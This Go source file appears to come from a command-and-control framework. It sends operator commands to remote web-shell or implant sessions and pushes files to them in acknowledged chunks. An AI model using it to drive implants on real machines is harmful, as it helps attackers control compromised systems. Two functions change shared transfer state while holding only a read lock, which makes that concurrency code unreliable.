package core

import (
	"errors"
	"strconv"
	"fmt"
	"time"
)

func CmdExec(activeSession int, cmdString string, operator string) error{

	sessionVal, sessionExists := Sessions.Load(activeSession)
	if !sessionExists {
		return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
	}
	session := sessionVal.(Session)

	if session.CommandQuery != "" {
		data, err := ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, "", "")
		if err != nil {
			return err
		}

		LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)
		if operator == "server" {
			fmt.Println("\nSession " + strconv.Itoa(activeSession) + " returned:\n" + data)
		}
	} else {
		QueueImplantCommand(activeSession, cmdString, operator)

		// Small delay to help with client syncronization
		if operator != "server"{
			time.Sleep(2 * time.Second)
		}
	}

	return nil
}

// StartFileTransfer initializes a file transfer session, breaking the file into chunks
func StartFileTransfer(sessionID int, fileData string, chunkSize int) int {
	FileTransfersMutex.Lock()
	defer FileTransfersMutex.Unlock()

	chunks := make([]string, 0)
	for i := 0; i < len(fileData); i += chunkSize {
		end := i + chunkSize
		if end > len(fileData) {
			end = len(fileData)
		}
		chunks = append(chunks, fileData[i:end])
	}

	transfer := &FileTransferState{
		SessionID:     sessionID,
		Chunks:        chunks,
		TotalChunks:   len(chunks),
		CurrentChunk:  0,
		AckedChunks:   make(map[int]bool),
		Timestamp:     time.Now(),
		LastChunkTime: time.Now(),
	}

	FileTransfers[sessionID] = transfer
	return len(chunks)
}

// GetNextFileChunk retrieves the next chunk to send, or a missing chunk if one was lost
func GetNextFileChunk(sessionID int) (string, int, int, bool) {
	FileTransfersMutex.RLock()
	defer FileTransfersMutex.RUnlock()

	transfer, exists := FileTransfers[sessionID]
	if !exists {
		return "", 0, 0, false
	}

	// Check for unacknowledged chunks that need to be resent
	for i := 0; i < transfer.CurrentChunk; i++ {
		if !transfer.AckedChunks[i] {
			// Resend this missing chunk
			return transfer.Chunks[i], i, transfer.TotalChunks, true
		}
	}

	// Send next chunk if available
	if transfer.CurrentChunk < transfer.TotalChunks {
		chunk := transfer.Chunks[transfer.CurrentChunk]
		idx := transfer.CurrentChunk
		total := transfer.TotalChunks
		transfer.CurrentChunk++
		transfer.LastChunkTime = time.Now()
		return chunk, idx, total, true
	}

	return "", 0, 0, false
}

// AckFileChunk marks a chunk as received
func AckFileChunk(sessionID int, chunkIndex int) bool {
	FileTransfersMutex.Lock()
	transfer, exists := FileTransfers[sessionID]
	if !exists {
		FileTransfersMutex.Unlock()
		return false
	}

	transfer.AckedChunks[chunkIndex] = true
	ackedCount := len(transfer.AckedChunks)
	totalChunks := transfer.TotalChunks

	// Calculate progress percentage
	progressPercent := (ackedCount * 100) / totalChunks
	currentThreshold := (progressPercent / 10) * 10
	
	// Check if we need to report progress
	shouldReport := false
	if currentThreshold > transfer.LastProgress || progressPercent == 100 {
		shouldReport = true
		transfer.LastProgress = currentThreshold
		if progressPercent == 100 {
			transfer.LastProgress = 100
		}
	}

	// If all chunks acknowledged, mark for cleanup
	allAcked := ackedCount == totalChunks
	FileTransfersMutex.Unlock()

	// Report progress outside the lock
	if shouldReport {
		statusMsg := fmt.Sprintf("[Session %d] File Transfer Progress: %d%% (%d/%d chunks)", 
			sessionID, currentThreshold, ackedCount, totalChunks)
		LogData(statusMsg)
		fmt.Println(statusMsg)
	}

	if allAcked {
		FileTransfersMutex.Lock()
		delete(FileTransfers, sessionID)
		FileTransfersMutex.Unlock()
		
		completionMsg := fmt.Sprintf("[Session %d] File Transfer Complete: 100%% (%d/%d chunks)", 
			sessionID, totalChunks, totalChunks)
		LogData(completionMsg)
		fmt.Println(completionMsg)
	}

	return true
}

// CompleteFileTransfer marks transfer as done and cleans up
func CompleteFileTransfer(sessionID int) {
	FileTransfersMutex.Lock()
	defer FileTransfersMutex.Unlock()

	delete(FileTransfers, sessionID)
}

// GetFileTransferProgress returns the current progress percentage and logs if it crosses 10% threshold
func GetFileTransferProgress(sessionID int) int {
	FileTransfersMutex.RLock()
	defer FileTransfersMutex.RUnlock()

	transfer, exists := FileTransfers[sessionID]
	if !exists {
		return 0
	}

	if transfer.TotalChunks == 0 {
		return 0
	}

	ackedCount := len(transfer.AckedChunks)
	progressPercent := (ackedCount * 100) / transfer.TotalChunks

	// Calculate which 10% threshold we're currently at
	currentThreshold := (progressPercent / 10) * 10
	
	// Report if we've crossed into a new 10% threshold or reached 100%
	if currentThreshold > transfer.LastProgress || (progressPercent == 100 && transfer.LastProgress < 100) {
		statusMsg := fmt.Sprintf("[Session %d] File Transfer Progress: %d%% (%d/%d chunks)", 
			sessionID, currentThreshold, ackedCount, transfer.TotalChunks)
		LogData(statusMsg)
		fmt.Println(statusMsg)
		
		// Update last reported progress to current threshold
		transfer.LastProgress = currentThreshold
	}

	return progressPercent
}

